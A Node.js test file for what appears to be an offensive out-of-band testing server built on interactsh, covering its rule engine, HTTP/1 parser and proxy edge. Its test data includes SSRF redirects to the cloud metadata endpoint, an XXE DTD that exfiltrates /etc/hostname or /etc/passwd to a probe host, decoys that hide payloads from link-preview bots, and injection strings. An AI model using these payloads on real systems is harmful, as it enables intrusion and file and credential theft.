// Edge, rule engine and HTTP/1 reader. The integration tests run the real edge on loopback ports
// against fake interactsh upstreams, with a throwaway self-signed certificate.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import net from "node:net";
import tls from "node:tls";
import { spawn, execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync, readFileSync, renameSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { PassThrough } from "node:stream";
import { validateHttpRule, respond, serialize, describeRule, describeDecoy, xxeParts } from "../lib/rules.mjs";
import { Reader, readHead, readBody, HttpError } from "../lib/http1.mjs";
import { ownership, sniOf, withOrigin, routeOf } from "../edge.mjs";
import { lenientHead } from "../lib/http1.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const CID = "abcdefghij0123456789";
const ID = CID + "klmnopqrstuvw"; // 33 chars
const DOMAIN = "oob.example";

// ---------- rules ----------
test("rules: validation explains what is wrong", () => {
  assert.match(validateHttpRule({ mode: "redirect", status: 302 }).error, /Location is required/);
  assert.match(validateHttpRule({ mode: "redirect", status: 200, location: "http://x/" }).error, /301, 302/);
  assert.match(validateHttpRule({ mode: "redirect", location: "javascript:alert(1)" }).error, /must start with/);
  assert.match(validateHttpRule({ mode: "redirect", location: "http://a/\r\nSet-Cookie: x" }).error, /one URL/);
  assert.match(validateHttpRule({ mode: "custom", headers: [["Content-Length", "1"]] }).error, /set by the edge/);
  assert.match(validateHttpRule({ mode: "custom", headers: [["X-A", "a\r\nb"]] }).error, /one line/);
  assert.match(validateHttpRule({ mode: "custom", headers: [["bad name", "v"]] }).error, /not valid/);
  assert.match(validateHttpRule({ mode: "custom", delayMs: 70000 }).error, /Delay/);
  assert.match(validateHttpRule({ mode: "custom", body: "x".repeat(300 * 1024) }).error, /256 KB/);
  assert.equal(validateHttpRule({ mode: "redirect", location: "gopher://127.0.0.1:6379/_x", loop: 3 }).rule.loop, 3);
});

test("rules: default reply is interactsh's, body is the reversed id", () => {
  const res = respond(null, null, { scheme: "http", method: "GET", target: "/", host: "x", uniqueId: "abc", domain: DOMAIN });
  const wire = serialize(res).toString();
  assert.match(wire, /^HTTP\/1\.1 200 OK\r\nConnection: close\r\nAccess-Control-Allow-Credentials: true/);
  assert.match(wire, /X-Interactsh-Version: 1\.4\.1\r\nContent-Length: 42\r\n\r\n<html><head><\/head><body>cba<\/body><\/html>$/);
  assert.deepEqual(res.answer, { by: "colluder", mode: "default", version: null });
});

test("rules: redirect loop walks hops through the probe, then leaves", () => {
  const { rule } = validateHttpRule({ mode: "redirect", status: 307, location: "http://169.254.169.254/latest/", loop: 2 });
  const req = (target) => ({ scheme: "https", method: "GET", target, host: `${ID}.${DOMAIN}`, uniqueId: ID, domain: DOMAIN });
  const h1 = respond(rule, 4, req("/fetch/?a=1"));
  assert.equal(h1.headers.find(([n]) => n === "Location")[1], `https://${ID}.${DOMAIN}/fetch/?a=1&hop=2`);
  assert.deepEqual(h1.answer, { by: "colluder", mode: "redirect", version: 4, hop: 1 });
  assert.equal(respond(rule, 4, req("/fetch/?hop=2&a=1")).headers.find(([n]) => n === "Location")[1], `https://${ID}.${DOMAIN}/fetch/?a=1&hop=3`);
  const last = respond(rule, 4, req("/fetch/?hop=3"));
  assert.equal(last.headers.find(([n]) => n === "Location")[1], "http://169.254.169.254/latest/");
  assert.equal(last.status, 307);
  assert.equal(describeRule(rule).line, "loop ×2, then 307 → 169.254.169.254");
});

test("rules: loop hops cycle through odd 3xx codes; the exit keeps the redirect status", () => {
  const { rule } = validateHttpRule({ mode: "redirect", status: 302, location: "http://169.254.169.254/", loop: 3, hopStatuses: "305, 309" });
  assert.deepEqual(rule.hopStatuses, [305, 309]);
  const req = (target) => ({ scheme: "http", method: "GET", target, host: `${ID}.${DOMAIN}`, uniqueId: ID, domain: DOMAIN });
  assert.deepEqual([1, 2, 3, 4].map((h) => respond(rule, 1, req(`/x?hop=${h}`)).status), [305, 309, 305, 302]);
  assert.equal(respond(rule, 1, req("/x")).answer.status, 305);
  assert.match(serialize(respond(rule, 1, req("/x?hop=2"))).toString("latin1"), /^HTTP\/1\.1 309 Redirect\r\n/);
  assert.equal(describeRule(rule).line, "loop ×3 (305/309), then 302 → 169.254.169.254");
  assert.equal(validateHttpRule({ mode: "redirect", location: "http://x/", loop: 2, hopStatuses: [200] }).error, "Hop codes must be redirects: 301, 302, 303, 307, 308, 300, 305, 306, 309, 310.");
  assert.equal(validateHttpRule({ mode: "redirect", status: 310, location: "http://x/" }).rule.status, 310);
  assert.equal(validateHttpRule({ mode: "redirect", location: "http://x/", hopStatuses: [305] }).rule.hopStatuses, undefined, "no loop, no hop codes");
});

test("rules: a decoy sends the default reply to the first requests, a User-Agent or a source", () => {
  const { rule } = validateHttpRule({ mode: "redirect", status: 302, location: "http://169.254.169.254/", delayMs: 500, decoy: { first: 1, ua: "Slackbot", sources: "203.0.113.9" } });
  assert.deepEqual(rule.decoy, { first: 1, ua: "Slackbot", sources: ["203.0.113.9"] });
  const req = (o) => ({ scheme: "http", method: "GET", target: "/x", host: `${ID}.${DOMAIN}`, uniqueId: ID, domain: DOMAIN, ua: "curl/8", ip: "198.51.100.1", seen: 1, ...o });
  const first = respond(rule, 2, req({ seen: 0 }));
  assert.equal(first.status, 200);
  assert.equal(first.delayMs, 0, "a decoy answers at once");
  assert.deepEqual(first.answer, { by: "colluder", mode: "redirect", version: 2, decoy: "first" });
  assert.equal(respond(rule, 2, req({ ua: "Slackbot-LinkExpanding 1.0" })).answer.decoy, "user-agent");
  assert.equal(respond(rule, 2, req({ ip: "203.0.113.9" })).answer.decoy, "source");
  const real = respond(rule, 2, req({}));
  assert.equal(real.status, 302);
  assert.equal(real.answer.decoy, undefined);
  assert.equal(describeDecoy(rule.decoy), 'the first request, User-Agents containing "Slackbot", 203.0.113.9');
  assert.equal(describeRule(rule).line, "decoy, 302 → 169.254.169.254");
  assert.equal(validateHttpRule({ mode: "custom", decoy: { first: "", ua: "", sources: "" } }).rule.decoy, undefined, "an empty decoy is none");
  assert.equal(validateHttpRule({ mode: "custom", decoy: { sources: "evil.example" } }).error, 'Decoy source "evil.example" is not an IP address.');
  assert.equal(validateHttpRule({ mode: "custom", decoy: { first: 21 } }).error, "Decoy count must be 0 to 20 requests.");
  assert.equal(validateHttpRule({ mode: "default", decoy: { first: 1 } }).rule.decoy, undefined);
});

test("rules: a HEAD decoy, and the exit redirect records where it pointed", () => {
  const { rule } = validateHttpRule({ mode: "redirect", status: 302, location: "http://169.254.169.254/latest/meta-data/iam/info", loop: 1, decoy: { methods: "head" } });
  assert.deepEqual(rule.decoy, { methods: ["HEAD"] });
  const req = (method, target) => ({ scheme: "http", method, target, host: `x.${ID}.${DOMAIN}`, uniqueId: ID, domain: DOMAIN, seen: 0 });
  const head = respond(rule, 1, req("HEAD", "/"));
  assert.equal(head.status, 200);
  assert.equal(head.answer.decoy, "method");
  const hop1 = respond(rule, 1, req("GET", "/"));
  assert.equal(hop1.answer.to, undefined, "a loop hop points back at the probe");
  const exit = respond(rule, 1, req("GET", "/?hop=2"));
  assert.deepEqual(exit.answer, { by: "colluder", mode: "redirect", version: 1, hop: 2, code: 302, to: "169.254.169.254" });
  assert.equal(describeDecoy(rule.decoy), "HEAD requests");
  assert.equal(validateHttpRule({ mode: "custom", decoy: { methods: "GET; rm" } }).error, "Decoy methods must be up to 4 HTTP methods, like HEAD.");
});

test("rules: the XXE preset answers by path; everything else gets the default reply", () => {
  const host = `fetch.${ID}.${DOMAIN}`;
  const { rule } = validateHttpRule({ mode: "preset", kind: "xxe", params: { host, file: "/etc/hostname" } });
  const req = (scheme, target, h = `kx1.${host}`) => ({ scheme, method: "GET", target, host: h, uniqueId: ID, domain: DOMAIN });
  const dtd = respond(rule, 1, req("http", "/x.dtd"));
  assert.equal(dtd.answer.part, "x.dtd");
  assert.equal(dtd.headers.find(([n]) => n === "Content-Type")[1], "application/xml-dtd");
  assert.equal(dtd.body.toString(), `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kx0.${host}/d?d=%file;'>">\n%eval;\n%exfil;\n`);
  assert.equal(respond(rule, 1, req("https", "/fetch/k/kx6/x.dtd", `${ID}.${DOMAIN}`)).answer.part, "x.dtd", "HTTPS, tag in the path");
  assert.match(respond(rule, 1, req("http", "/feed.xml")).body.toString(), new RegExp(`<!DOCTYPE rss SYSTEM "http://kx0\\.${host.replace(/\./g, "\\.")}/x\\.dtd">`));
  const data = respond(rule, 1, req("http", "/d?d=user", `kx0.${host}`));
  assert.equal(data.answer.part, undefined);
  assert.match(data.body.toString(), /<html>/, "exfil lands on the default reply");
  assert.equal(xxeParts({ host, file: "php://filter/convert.base64-encode/resource=/etc/passwd" })["x.dtd"].body.split("\n")[0], `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`);
  assert.equal(describeRule(rule).line, "an XXE DTD reading /etc/hostname, plus feed.xml and sitemap.xml");
  for (const file of ['/etc/x" SYSTEM "http://evil/', "/etc/a b", "/etc/%x", "http://evil/x"]) assert.match(validateHttpRule({ mode: "preset", kind: "xxe", params: { host, file } }).error, /^File must be/, file);
  assert.match(validateHttpRule({ mode: "preset", kind: "xxe", params: { host: "evil.com", file: "/etc/hostname" } }).error, /^Preset host/);
  assert.match(validateHttpRule({ mode: "preset", kind: "nope", params: {} }).error, /^Preset must be/);
});

test("rules: a hosted file can carry extra headers", () => {
  const { rule } = validateHttpRule({ mode: "file", contentType: "text/javascript", body: "x", headers: [["Access-Control-Allow-Origin", "*"]] });
  const r = respond(rule, 1, { scheme: "https", method: "GET", target: "/t/c.js", host: `${ID}.${DOMAIN}`, uniqueId: ID, domain: DOMAIN });
  assert.deepEqual(r.headers.slice(0, 3), [["Connection", "close"], ["Content-Type", "text/javascript"], ["Access-Control-Allow-Origin", "*"]]);
  assert.match(validateHttpRule({ mode: "file", headers: [["Content-Length", "1"]] }).error, /set by the edge/);
});

test("rules: custom and file answers; HEAD gets no body; scheme switch falls back to default", () => {
  const { rule } = validateHttpRule({ mode: "custom", status: 418, headers: [["X-Probe", "1"]], body: "hi", delayMs: 5, schemes: { http: true, https: false } });
  const req = { scheme: "http", method: "GET", target: "/", host: "h", uniqueId: "x", domain: DOMAIN };
  const res = respond(rule, 2, req);
  assert.equal(serialize(res).toString(), `HTTP/1.1 418 I'm a teapot\r\nConnection: close\r\nX-Probe: 1\r\nServer: ${DOMAIN}\r\nContent-Length: 2\r\n\r\nhi`);
  assert.equal(res.delayMs, 5);
  assert.match(serialize(res, "HEAD").toString(), /Content-Length: 2\r\n\r\n$/);
  assert.equal(respond(rule, 2, { ...req, scheme: "https" }).answer.mode, "default");
  const f = validateHttpRule({ mode: "file", contentType: "application/xml-dtd", body: "PD94bWw+", bodyEncoding: "base64" }).rule;
  assert.match(serialize(respond(f, 1, req)).toString(), /Content-Type: application\/xml-dtd\r\n.*Content-Length: 6\r\n\r\n<\?xml>$/s);
});

// ---------- HTTP/1 reader ----------
async function parse(bytes) {
  const s = new PassThrough();
  const r = new Reader(s);
  s.end(Buffer.from(bytes, "latin1"));
  const head = await readHead(r, Date.now() + 1000);
  const body = await readBody(r, head, Date.now() + 1000);
  return { head, body };
}

test("http1: chunked body is kept exactly as it came over the wire", async () => {
  const wire = "POST /x HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n2;ext=1\r\nde\r\n0\r\nX-T: 1\r\n\r\n";
  const { head, body } = await parse(wire);
  assert.equal(head.method, "POST");
  assert.equal(Buffer.concat([head.raw, body.body]).toString("latin1"), wire);
});

test("http1: ambiguous framing is refused", async () => {
  await assert.rejects(parse("POST / HTTP/1.1\r\nContent-Length: 1\r\nContent-Length: 2\r\n\r\nab"), (e) => e instanceof HttpError && e.status === 400);
  await assert.rejects(parse("POST / HTTP/1.1\r\nContent-Length: 1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"), (e) => e.status === 400);
  await assert.rejects(parse("GET / HTTP/1.1\r\n folded: x\r\n\r\n"), (e) => e.status === 400);
});

test("edge: ownership needs a 33-char label starting with one of our correlation ids", () => {
  assert.deepEqual(ownership(`e2e.${ID}.${DOMAIN}:80`, [CID]), { uniqueId: ID, fullId: `e2e.${ID}` });
  assert.deepEqual(ownership(`${ID.toUpperCase()}.${DOMAIN}.`, [CID]), { uniqueId: ID, fullId: ID });
  assert.equal(ownership(`e2e.zzzzzzzzzzzzzzzzzzzzklmnopqrstuvw.${DOMAIN}`, [CID]), null);
  assert.equal(ownership(`e2e.${ID}x.${DOMAIN}`, [CID]), null);
});

// ---------- integration ----------
const freePort = () => new Promise((ok) => { const s = net.createServer().listen(0, "127.0.0.1", () => { const p = s.address().port; s.close(() => ok(p)); }); });
let dir, edge, ports = {}, upSeen = [], upHttp, upHttps;

function fakeUpstream(secure, cert) {
  const onConn = (sock) => {
    let got = Buffer.alloc(0);
    sock.on("data", (d) => {
      got = Buffer.concat([got, d]);
      if (got.includes("\r\n\r\n")) { upSeen.push({ secure, bytes: got.toString("latin1") }); sock.end("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 8\r\n\r\nupstream"); }
    });
  };
  return secure ? tls.createServer(cert, onConn) : net.createServer(onConn);
}

function request(port, bytes, secure = false) {
  return new Promise((ok, fail) => {
    const sock = secure ? tls.connect({ host: "127.0.0.1", port, rejectUnauthorized: false, servername: `${ID}.${DOMAIN}` }) : net.connect({ host: "127.0.0.1", port });
    let out = Buffer.alloc(0);
    sock.on(secure ? "secureConnect" : "connect", () => sock.write(bytes));
    sock.on("data", (d) => { out = Buffer.concat([out, d]); });
    sock.on("end", () => ok(out.toString("latin1")));
    sock.on("error", fail);
    setTimeout(() => { sock.destroy(); fail(new Error("timeout")); }, 5000);
  });
}
const edgeLines = () => readFileSync(join(dir, "edge.jsonl"), "utf8").trim().split("\n").filter(Boolean).map((l) => JSON.parse(l));
const sleep = (ms) => new Promise((ok) => setTimeout(ok, ms));

before(async () => {
  dir = mkdtempSync(join(tmpdir(), "colluder-edge-"));
  execFileSync("openssl", ["req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-subj", "/CN=test", "-days", "1",
    "-keyout", join(dir, "key.pem"), "-out", join(dir, "cert.pem")], { stdio: "ignore" });
  const cert = { cert: readFileSync(join(dir, "cert.pem")), key: readFileSync(join(dir, "key.pem")) };
  for (const k of ["http", "https", "upHttp", "upHttps"]) ports[k] = await freePort();
  upHttp = fakeUpstream(false).listen(ports.upHttp, "127.0.0.1");
  upHttps = fakeUpstream(true, cert).listen(ports.upHttps, "127.0.0.1");
  writeFileSync(join(dir, "rules.json"), JSON.stringify({ cids: [CID], rules: {} }));
  edge = spawn(process.execPath, [join(HERE, "..", "edge.mjs")], {
    env: { ...process.env, COLLUDER_DATA: dir, COLLUDER_EDGE_HTTP: `127.0.0.1:${ports.http}`, COLLUDER_EDGE_HTTPS: `127.0.0.1:${ports.https}`,
      COLLUDER_UPSTREAM_HTTP: `127.0.0.1:${ports.upHttp}`, COLLUDER_UPSTREAM_HTTPS: `127.0.0.1:${ports.upHttps}`,
      COLLUDER_EDGE_CERT: join(dir, "cert.pem"), COLLUDER_EDGE_KEY: join(dir, "key.pem") },
    stdio: ["ignore", "pipe", "inherit"],
  });
  await new Promise((ok) => { let seen = ""; edge.stdout.on("data", (d) => { seen += d; if (seen.includes("edge https on")) ok(); }); });
});

after(async () => {
  if (edge && edge.exitCode === null) { const gone = new Promise((ok) => edge.once("exit", ok)); edge.kill("SIGTERM"); await gone; }
  upHttp?.close(); upHttps?.close();
  rmSync(dir, { recursive: true, force: true });
});

test("edge: own HTTP hit gets the default reply and is recorded byte-for-byte", async () => {
  const req = `POST /a?b=1 HTTP/1.1\r\nHost: e2e.${ID}.${DOMAIN}\r\nContent-Length: 5\r\nX-Odd:   spaced  \r\n\r\nhello`;
  const res = await request(ports.http, req);
  assert.match(res, /^HTTP\/1\.1 200 OK\r\n/);
  assert.ok(res.endsWith(`<body>${[...ID].reverse().join("")}</body></html>`));
  const line = edgeLines().at(-1);
  assert.equal(line["raw-request"], req);
  assert.equal(line["raw-response"], res);
  assert.equal(line.protocol, "http");
  assert.equal(line["full-id"], `e2e.${ID}`);
  assert.equal(line["remote-address"], "127.0.0.1");
  assert.deepEqual(line["colluder-answer"], { by: "colluder", mode: "default", version: null, tag: "e2e" });
  assert.equal(upSeen.length, 0, "own traffic never reaches interactsh");
});

test("edge: a saved rule answers within a second, over HTTPS with the tag in the path", async () => {
  const rule = validateHttpRule({ mode: "redirect", status: 302, location: "http://169.254.169.254/", loop: 1 }).rule;
  writeFileSync(join(dir, "rules.next"), JSON.stringify({ cids: [CID], rules: { fetch: { version: 3, rule } } }));
  renameSync(join(dir, "rules.next"), join(dir, "rules.json"));
  await sleep(1600);
  const r1 = await request(ports.https, `GET /fetch/x HTTP/1.1\r\nHost: ${ID}.${DOMAIN}\r\n\r\n`, true);
  assert.match(r1, new RegExp(`^HTTP/1\\.1 302 Found\\r\\nConnection: close\\r\\nLocation: https://${ID}\\.${DOMAIN}/fetch/x\\?hop=2\\r\\n`));
  const r2 = await request(ports.https, `GET /fetch/x?hop=2 HTTP/1.1\r\nHost: ${ID}.${DOMAIN}\r\n\r\n`, true);
  assert.match(r2, /Location: http:\/\/169\.254\.169\.254\/\r\n/);
  const [a, b] = edgeLines().slice(-2);
  assert.equal(a.protocol, "https");
  assert.deepEqual(a["colluder-answer"], { by: "colluder", mode: "redirect", version: 3, hop: 1, tag: "fetch" });
  assert.equal(b["colluder-answer"].hop, 2);
});

test("edge: a decoy for the first request, then the rule; a new version counts again", async () => {
  const save = (version) => {
    const rule = validateHttpRule({ mode: "redirect", status: 302, location: "http://169.254.169.254/", decoy: { first: 1 } }).rule;
    writeFileSync(join(dir, "rules.next"), JSON.stringify({ cids: [CID], rules: { pre: { version, rule } } }));
    renameSync(join(dir, "rules.next"), join(dir, "rules.json"));
  };
  save(1);
  await sleep(1600);
  const get = () => request(ports.http, `GET /x HTTP/1.1\r\nHost: pre.${ID}.${DOMAIN}\r\n\r\n`);
  assert.match(await get(), /^HTTP\/1\.1 200 OK\r\n/);
  assert.match(await get(), /^HTTP\/1\.1 302 Found\r\n/);
  assert.equal(edgeLines().at(-2)["colluder-answer"].decoy, "first");
  save(2);
  await sleep(1600);
  assert.match(await get(), /^HTTP\/1\.1 200 OK\r\n/, "version 2 starts its own count");
});

test("edge: foreign traffic is relayed with the real client IP; a spoofed origin header is replaced", async () => {
  const other = "zzzzzzzzzzzzzzzzzzzzklmnopqrstuvw";
  const res = await request(ports.http, `GET /x HTTP/1.1\r\nHost: t.${other}.${DOMAIN}\r\nX-Colluder-Origin-IP: 6.6.6.6\r\n\r\n`);
  assert.match(res, /upstream$/);
  const seen = upSeen.at(-1);
  assert.equal(seen.secure, false);
  assert.match(seen.bytes, /^GET \/x HTTP\/1\.1\r\nX-Colluder-Origin-IP: 127\.0\.0\.1\r\nHost: t\./);
  assert.doesNotMatch(seen.bytes, /6\.6\.6\.6/);

  const res2 = await request(ports.https, `GET / HTTP/1.1\r\nHost: ${other}.${DOMAIN}\r\nAccept: */*\r\n\r\n`, true);
  assert.match(res2, /upstream$/);
  assert.equal(upSeen.at(-1).secure, true, "HTTPS stays HTTPS to interactsh");
  assert.equal(upSeen.at(-1).bytes, `GET / HTTP/1.1\r\nX-Colluder-Origin-IP: 127.0.0.1\r\nHost: ${other}.${DOMAIN}\r\nAccept: */*\r\n\r\n`, "otherwise untouched");
});

test("edge: TLS for the apex (interactsh's polling API) passes through untouched", async () => {
  const res = await new Promise((ok, fail) => {
    const sock = tls.connect({ host: "127.0.0.1", port: ports.https, rejectUnauthorized: false, servername: DOMAIN });
    let out = "";
    sock.on("secureConnect", () => sock.write(`POST /poll HTTP/1.1\r\nHost: ${DOMAIN}\r\n\r\n`));
    sock.on("data", (d) => { out += d; });
    sock.on("end", () => ok(out));
    sock.on("error", fail);
  });
  assert.match(res, /upstream$/);
  assert.equal(upSeen.at(-1).bytes, `POST /poll HTTP/1.1\r\nHost: ${DOMAIN}\r\n\r\n`, "no header injected: the edge never decrypted it");
});

test("edge: server name is read from the ClientHello", () => {
  const hello = Buffer.from("16030100a5010000a10303" + "00".repeat(32) + "00" + "0002c02f" + "0100" + "0017" + "0000" + "0013" + "0011" + "00" + "000e" + Buffer.from("a.example.test").toString("hex"), "hex");
  hello.writeUInt16BE(hello.length - 5, 3);
  assert.deepEqual(sniOf(hello), { done: true, tls: true, sni: "a.example.test", alpn: [] });
  assert.deepEqual(sniOf(hello.subarray(0, 20)), { done: false });
  assert.deepEqual(sniOf(Buffer.from("GET / HTTP/1.1\r\n")), { done: true, tls: false, sni: null });
});

test("edge: unparseable foreign requests reach interactsh with the real origin, never a client-supplied one", async () => {
  const res = await request(ports.http, "NOT HTTP AT ALL\r\n\r\n");
  assert.match(res, /upstream$/);
  assert.equal(upSeen.at(-1).bytes, "NOT HTTP AT ALL\r\nX-Colluder-Origin-IP: 127.0.0.1\r\n\r\n");
  const other = "zzzzzzzzzzzzzzzzzzzzklmnopqrstuvw";
  await request(ports.http, `M-SEARCH * HTTP/1.1\r\nHost: t.${other}.${DOMAIN}\r\nX-Colluder-Origin-IP: 203.0.113.77\r\nbad header line\r\n\r\n`);
  assert.doesNotMatch(upSeen.at(-1).bytes, /203\.0\.113\.77/);
  assert.match(upSeen.at(-1).bytes, /^M-SEARCH \* HTTP\/1\.1\r\nX-Colluder-Origin-IP: 127\.0\.0\.1\r\n/);
  assert.equal(withOrigin(Buffer.from("GET / HTTP/1.1\r\nx-colluder-origin-ip: 1.2.3.4"), "9.9.9.9"), null, "no head end: refused when the header is there");
});

test("edge: a malformed request addressed to a probe is recorded and answered, not relayed", async () => {
  const before = upSeen.length;
  // what an old Java XXE client sends for a two-line file: the newline splits the request line
  const req = `GET /d?d=line one\nline two HTTP/1.1\r\nHost: kx0.e2e.${ID}.${DOMAIN}\r\nUser-Agent: Java/1.8.0_151\r\n\r\n`;
  const res = await request(ports.http, req);
  assert.match(res, /^HTTP\/1\.1 200 OK/);
  const line = edgeLines().at(-1);
  assert.equal(line["raw-request"], req);
  assert.equal(line["colluder-answer"].tag, "e2e");
  assert.equal(line["colluder-answer"].malformed, "bad request line");
  assert.equal(upSeen.length, before, "nothing relayed");
  const lh = lenientHead(Buffer.from(req));
  assert.equal(lh.target, "/d?d=line one\nline two");
  assert.equal(lh.get("user-agent")[0], "Java/1.8.0_151");
});

test("edge: absolute-form requests route by the target's authority; token methods are fine", async () => {
  await request(ports.http, `GET http://abs.${ID}.${DOMAIN}/x HTTP/1.1\r\nHost: shop.example\r\n\r\n`);
  assert.equal(edgeLines().at(-1)["full-id"], `abs.${ID}`);
  await request(ports.http, `PROPFIND / HTTP/1.1\r\nHost: dav.${ID}.${DOMAIN}\r\n\r\n`);
  assert.equal(edgeLines().at(-1)["colluder-answer"].malformed, undefined);
  assert.equal(routeOf("", `http://u:p@abs.${ID}.${DOMAIN}:80/`, [CID]).own.fullId, `abs.${ID}`);
});

test("edge: a request that isn't UTF-8 keeps its exact bytes", async () => {
  const head = `POST / HTTP/1.1\r\nHost: bin.${ID}.${DOMAIN}\r\nContent-Length: 4\r\n\r\n`;
  const bytes = Buffer.concat([Buffer.from(head), Buffer.from([0xff, 0x00, 0xfe, 0x80])]);
  await new Promise((ok) => { const s = net.connect(ports.http, "127.0.0.1", () => s.end(bytes)); s.on("close", ok); s.resume(); });
  const line = edgeLines().at(-1);
  assert.deepEqual(Buffer.from(line["raw-request-b64"], "base64"), bytes);
  assert.equal(edgeLines().filter((l) => l["full-id"] === `abs.${ID}`).every((l) => !l["raw-request-b64"]), true, "UTF-8 requests carry no copy");
});

test("edge: a TLS handshake for a probe that never completes is a hit", async () => {
  await new Promise((ok) => {
    const s = tls.connect({ host: "127.0.0.1", port: ports.https, servername: `deep.${ID}.${DOMAIN}`, ALPNProtocols: ["h2", "http/1.1"] }); // verifies: the test cert fails
    s.on("error", () => ok()); s.on("close", ok);
  });
  await sleep(300);
  const line = edgeLines().at(-1);
  assert.equal(line["full-id"], `deep.${ID}`);
  assert.equal(line["colluder-answer"].mode, "tls");
  assert.equal(line["colluder-answer"].tag, "deep");
  assert.deepEqual(line["colluder-answer"].tls.alpn, ["h2", "http/1.1"]);
  assert.equal(Buffer.from(line["raw-request-b64"], "base64")[0], 0x16, "the ClientHello bytes");
});

test("edge: status file reports listeners and counts", () => {
  const st = JSON.parse(readFileSync(join(dir, "edge.status.json"), "utf8"));
  assert.equal(st.listen.http, `127.0.0.1:${ports.http}`);
  assert.equal(st.stopped, false);
  assert.ok(st.cert.notAfter);
});
